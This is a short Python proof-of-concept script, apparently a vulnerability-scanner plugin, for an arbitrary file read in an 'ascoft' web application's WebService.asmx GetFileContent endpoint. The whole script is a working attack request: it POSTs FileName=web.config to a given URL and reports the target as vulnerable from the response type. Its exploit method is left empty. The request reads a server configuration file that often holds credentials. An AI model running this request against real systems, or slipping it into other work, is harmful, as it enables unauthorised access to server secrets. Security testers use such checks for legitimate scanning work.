# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class acsoft_GetFileContent_fileread(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'ascoft',
            'vuln_title':'ascoft_GetFileContent_fileread',
            'vuln_level':1,
            'vuln_type':4,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任意文件读取',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        post_data = {
            "VirtualPath":"",
            "FileName":"web.config"
        }
        payload = "/WS/WebService.asmx/GetFileContent"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if req.headers["Content-Type"] == "application/xml":
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = acsoft_GetFileContent_fileread("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)